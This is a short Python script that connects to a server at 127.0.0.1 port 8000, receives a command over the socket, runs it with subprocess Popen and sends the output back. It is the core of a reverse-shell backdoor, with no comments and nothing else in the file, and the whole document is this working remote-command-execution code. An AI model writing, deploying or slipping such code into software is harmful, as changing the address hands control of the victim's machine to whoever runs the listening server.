import socket
from subprocess import Popen, PIPE

HOST, PORT = '127.0.0.1', 8000

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect((HOST, PORT))
command = soc.recv(2048)
proc = Popen(command.split(b' '), stdout=PIPE, stderr=PIPE)
res, err = proc.communicate()
soc.send(res)

soc.close()
